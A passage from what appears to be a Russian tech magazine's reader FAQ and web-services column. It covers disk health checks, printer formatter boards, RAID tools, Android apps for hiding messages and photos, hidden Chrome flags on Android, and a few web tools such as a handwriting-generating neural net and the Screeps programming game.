ет файлы с диска, то и дело вываливается в BSoD, то стоит заглянуть в логи
системы. Если там найдутся ошибки диска, то это очень серьезный повод заду-
маться о его здоровье. Обычно, когда ошибки появляются, они льются огром-
ным потоком, а диск тем временем умирает на глазах. Третий и самый дей-
ственный —  это просмотр SMART  диска. Конечно  же, он не сможет
спрогнозировать, когда тот или иной диск выйдет из строя, но по крайней мере
отразит текущее состояние вещей.

     Узнал, что в принтерах стоит так называемый форматер. Что это
Q  за зверь?
    Это управляющая плата принтера, она отвечает за интерфейс компью-
A  тер — принтер и формирует управляющие сигналы для лазер-сканера.
Если принтер сетевой, то за сеть в нем будет отвечать как раз форматер. Это
наиболее дорогостоящая плата в принтере, обычно, когда она выходит из строя,
дешевле купить новый, чем пытаться ее заменить.





Пример форматера

Q Каким софтом лучше всего рулить хардварным рейдом?
    Для этих целей я рекомендую обратиться к тулзам производителей кон-
A  троллеров. Только они поддерживают все нужные функции и дают стопро-
центный шанс не убить RAID своими действиями.
КАК В ANDROID МОЖНО СКРЫТЬ СВОИ СМС
ОТ ПОСТОРОННИХ?


Как в Android можно скрыть свои СМС от посторонних?

          ZERO Communication (SMS). Эта программа поможет спрятать
     1     твои сообщения от чужих глаз. После установки и первого запу-
             ска программа попросит назначить ее приложением для работы
            с СМС по умолчанию. Теперь достаточно перенести сообщения,
            которые ты хочешь спрятать, в раздел приватных. Есть черный
            список и поддержка двух SIM-карт.

             KeepSafe. С приложением KeepSafe у тебя появится возможность
   2    переместить все интимные фото и видео в специальное храни-
            лище. Доступ к этому хранилищу будет иметь только владелец
             пин-кода. С приложением легко разобраться. Есть полезная
            функция «ложный пин-код». Она пригодится в том случае, если
              кто-то будет настойчиво просить показать содержимое KeepSafe.
           Набираешь установленный ложный PIN и показываешь специ-
            ально запасенное на этот случай содержимое. Правда, такая
            функция есть только в платной версии программы.

                Vault. Эта программа умеет скрывать не только фото и видео, но
   3    и контакты, СМС и даже сообщения в Facebook. У приложения
             есть платная версия, которая позволит хранить скрытые файлы в
             облаке, спрятать значок Vault и оповещать о попытках взлома.
            Как и в KeepSafe, здесь можно создать контейнер-пустышку для
            отвода глаз.

             AppLock. Это настоящий комбайн для сокрытия информации на
   4     Android. С его помощью можно прятать фотографии и видео, за-
             претить прием входящих звонков, предотвратить установку и уда-
            ление приложений, изменение настроек, запуск приложений и
            многое другое. При первом запуске ты задаешь код, с помощью
            которого сможешь получать доступ к хранилищу со скрытыми
           фото и видео, а также изменять настройки приложения. Советую
            внимательно изучить настройки AppLock, здесь можно найти для
            себя много полезного.
              Andrognito. Разработчики Andrognito обещают трехступенчатую
  5    защиту файлов. Здесь есть выбор между двумя типами шифро-
             вания: быстрым и медленным. На практике медленное шифрова-
            ние оказывается не таким уж и медленным. С ним файлы будут
            действительно защищены, чего не скажешь о быстром шифро-
             вании. Приложение на английском языке, зато дизайн хорош.


Q  Какие фишки можешь рассказать про Chrome на Android?
    Все самое вкусное скрыто на служебной странице chrome://flags. Там со-
A  брано очень много крутых вещей. Можно, к примеру, активировать режим
очистки страниц от оформления.

chrome://flags/#enable-reader-mode-toolbar-icon

Эта опция добавляет новую кнопку на панель инструментов браузера — нажа-
тие отобразит открытую страницу в удобном для чтения виде. На ней останется
только текст и иллюстрации, а вся реклама и отвлекающие элементы оформле-
ния будут убраны.

chrome://flags/#disable-click-delay

Эта команда убирает задержку в 300 мс после нажатия на ссылку. Нужна она
для того, чтобы браузер убедился, что это не двойной тап, которым ты пыта-
ешься изменить масштаб отображения. Если выключить эту задержку, то ссыл-
ки будут открываться мгновенно, но нужно будет осторожнее выбирать место
для двойного тапа.

chrome://flags/#answers-in-sugges

Отображение подсказок в результатах поиска. Скажем, ты ищешь, сколько ме-
габайтов в гигабайте, а Google в подсказке сразу отвечает. Удобная штука, эко-
номящая время.

chrome://flags/#enable-instant-search-clicks

Эта скрытая функция позволяет быстрее открывать сайты, которые Google вы-
дал тебе на странице результатов поиска. Она активирует предварительную
параллельную загрузку ссылок с этой страницы, что может сэкономить от 100
до 150 мс. Это немного, да и трафика выходит больше, но при использовании
на вайфае будет плюсом.

chrome://flags/#max-tiles-for-interest-area

По умолчанию Chrome настроен таким образом, чтобы кушать как можно мень-
ше оперативной памяти. Однако мы можем изменить количество выделяемой
браузером памяти, установив это значение вручную. Эта опция не изменит ско-
рости загрузки сайтов, но может улучшить плавность скроллинга и переключе-
ние между открытыми вкладками. Следует учесть, что девайс должен обладать
достаточным количеством оперативной памяти, иначе будут выгружаться дру-
гие работающие в фоне программы. Оптимальное значение следует подобрать
самому, попробовав несколько разных вариантов — в зависимости от объема
памяти устройства.
     ГЕНЕРАТОР РУКОПИСНЫХ НАДПИСЕЙ
        www.cs.toronto.edu/~graves/handwriting.cgi
1





        Нейросеть, которая пишет как курица лапой
                      У этого сервиса нет даже названия — это всего лишь демонстра-
       ция алгоритма из научной работы, посвященной генерации рукопис-
       ных надписей при помощи глубокой нейросети. Отсутствие названия
       и модного интерфейса не мешают программе быть полезной. Когда
       нужна картинка с рукописным текстом, использовать ее куда проще,
       чем сканировать бумажку. В отличие от псевдорукописных шриф-
         тов, результат работы нейросети не отличишь от почерка человека.
      Можно настроить аккуратность (регулятор bias: больше — разбор-
        чивее), а также попросить сгенерировать несколько вариантов на
       выбор. Кириллица, увы, не поддерживается, зато есть исходники.
      LIGHTBEAM
         www.mozilla.org/en-US/lightbeam/
2





         Плагин для Firefox, позволяющий взглянуть на веб под новым углом
                        Почти каждый большой веб-сайт не ограничивается тем, что за-
        гружает данные с одного сервера. Каждый норовит подгрузить извне
      еще с десяток сторонних ресурсов — скрипты для аналитики и ре-
        кламы, шрифты, библиотеки и прочие радости. Плагин для Firefox под
        названием Lightbeam в наглядной форме показывает карту таких свя-
        зей для любого сайта, а также между сайтами (для этого достаточно
        открыть вкладку Lightbeam и пройтись по нужным ресурсам). Полезна
        такая возможность в том случае, если ты хочешь заблокировать ре-
         кламу, побороть слежку или же ищешь уязвимые места на сайтах.
     MARKDOWN & LATEX EDITOR
         tex.s2cms.ru/page/
3





         Текстовый редактор с поддержкой двух отличных форматов
                        При подготовке разного рода документации нередко нужен не
        только редактор с поддержкой форматирования, но и возможность
        добавлять математические формулы. Сервис по указанному адресу
        позволяет писать текст с разметкой Markdown и формулами в стиле
        LaTeX, а затем конвертировать в HTML. Формулы при этом вставля-
        ются как ссылка на SVG на сайте, но при желании можно все скачать
        вручную или набрать основной адрес (tex.s2cms.ru) и использовать
        генератор формул отдельно (он отдает SVG или PNG). Редактор так-
       же можно установить на свой сайт.
      SCREEPS
        screeps.com
4





         Игра для программистов
                        Обычно браузерные игры — это отдых на пять-десять минут.
        Screeps — развлечение совсем другого рода: тут надо думать и пи-
        сать код на JavaScript, чтобы соревноваться с другими игроками. По-
       допечные боты (крипы) — что-то вроде колонии муравьев. Задаем
        правила их поведения и смотрим, как они собирают ресурсы и вою-
       ют с другими колониями. В общем, Screeps — это не только увлека-
        тельная стратегия, но и возможность прокачать навыки JavaScript,
        а потенциально — овладеть искусством создания ИИ. Весь процесс
        происходит в браузере, а код хранится на сервере. Рекомендуется
        использовать Chrome.